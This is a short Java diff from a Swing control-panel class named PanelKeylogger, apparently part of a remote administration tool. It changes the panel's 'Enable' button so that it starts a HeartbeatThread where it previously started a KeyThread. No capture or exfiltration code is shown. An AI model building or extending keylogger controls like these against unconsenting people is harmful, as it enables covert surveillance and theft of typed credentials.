@@ -36,7 +36,7 @@ public class PanelKeylogger extends BaseControlPanel {
 		JToggleButton tglbtnEnable = new JToggleButton("Enable");
 		tglbtnEnable.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				new Thread(new KeyThread(getServer(), PanelKeylogger.this)).start();
+				new Thread(new HeartbeatThread(getServer(), PanelKeylogger.this)).start();
 			}
 		});
 		buttonGroup.add(tglbtnEnable);
